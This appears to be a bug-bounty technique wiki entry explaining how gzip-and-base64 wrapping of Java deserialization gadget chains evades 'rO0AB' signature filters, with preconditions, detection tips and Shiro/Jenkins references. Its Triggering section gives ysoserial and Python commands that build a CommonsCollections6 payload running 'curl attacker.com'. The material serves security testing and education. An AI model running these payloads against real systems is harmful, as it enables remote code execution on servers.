---
title: Java Deserialization — H4sI Gzip+Base64 Gadget Chain
slug: java-deserialization-h4si-gadget
created_utc: 2026-05-21T00:00:00Z
updated_utc: 2026-05-21T00:00:00Z
tags: [technique/server-side, technique/deserialization, technique/java, technique/rce]
inbound: []
---

# Java Deserialization — H4sI Gzip+Base64 Gadget Chain

## Pattern

Java's `ObjectInputStream.readObject()` is unsafe when called on attacker-controlled
data. The canonical serialized Java object starts with the magic bytes `AC ED 00 05`
(hex) or `rO0AB` (base64). However, many endpoints also accept GZIP-compressed
serialized objects; GZIP-compressed payloads begin with `H4sI` when base64-encoded.

If an application's deserialization endpoint accepts either raw or gzip-compressed
payloads (common in Shiro, Spring, Jenkins, and generic Java middleware), attackers
can wrap any `ysoserial` gadget chain in a `GZIPOutputStream` before base64 encoding
to bypass regex checks that only block `rO0AB`.

The BBRE episode also covered class allowlisting bypasses: if the deserializer
has a class allowlist (only specific packages accepted), finding a class within
the allowlist that extends `Serializable` and has a dangerous `readObject()`
implementation breaks the allowlist. Libraries like Apache Commons Collections
and Spring Framework have historically contained such gadgets.

## Preconditions

- Server deserializes Java objects from user-controlled input.
- Application has dangerous gadget chains on the classpath (CommonsCollections,
  Spring, Groovy, etc.).
- Endpoint accepts GZIP-compressed payloads, or allowlist checking is bypassable.

## Detection

- Send base64-encoded `H4sI` prefix payloads; observe for time delays
  (use `Thread.sleep(5000)` gadget), DNS callbacks, or error messages
  revealing class loading.
- Inspect JAR manifests and pom.xml for known gadget-containing libraries.
- Burp Scanner and Gadget Inspector can automate gadget chain discovery.

## Triggering

```bash
# Generate payload with ysoserial
java -jar ysoserial.jar CommonsCollections6 'curl attacker.com' > payload.bin

# GZIP compress and base64 encode
python3 -c "
import base64, gzip
data = open('payload.bin','rb').read()
compressed = gzip.compress(data)
print(base64.b64encode(compressed).decode())
"
# Output starts with H4sI...

# Submit to the vulnerable parameter
```

## Bypasses

- Allowlist bypass: identify allowlisted class with `readObject()` side effects
  using static analysis (Gadget Inspector).
- Signature bypass: `GZIP` wrapping bypasses `rO0AB` / `AC ED` pattern checks.
- Encoding variants: URL encoding, hex encoding of the base64 output.

## Seen in the wild

- 2021–2022 — Various enterprise Java applications. BBRE covered the H4sI
  gzip+base64 variant and class-allowlist bypass pattern as a common technique
  seen in mature Java application audits. The pattern appeared in Shiro
  authentication cookie deserialization and Jenkins remoting protocol attacks.
  [BBRE](https://www.youtube.com/watch?v=tEfjSs4fq8M)

## References

- ysoserial — Java deserialization exploit framework
- Gadget Inspector — static analysis for gadget chains
- CVE-2016-4437 (Apache Shiro RememberMe cookie deserialization)
- See also: [dotnet-remoting-objref](dotnet-remoting-objref.md) — .NET equivalent
